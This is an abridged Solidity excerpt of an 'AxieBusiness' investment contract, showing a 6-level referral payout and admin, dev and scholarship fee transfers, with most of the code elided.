...
contract AxieBusiness {
	...
	uint256 constant public SCHOLARSHIP_FEE = 10; // 10%; 
  ...
  constructor(address payable _admin, address payable _scholarship, address payable _dev) public {
    ...
    function invest(address referrer) public payable {
		...
		// 6 Level Referral
		   _refPayout(msg.sender,msgValue);
            ...
            uint256 _marketing_fees = msg.value.mul(3).div(PERCENTS_DIVIDER);
            uint256 _dev_fees = msg.value.mul(2).div(PERCENTS_DIVIDER);
            
            _safeTransfer(admin,_marketing_fees);
            _safeTransfer(dev, _dev_fees.div(2));
  ...
  function withdrawal() external{
    ...
    _safeTransfer(scholarship,_fees);
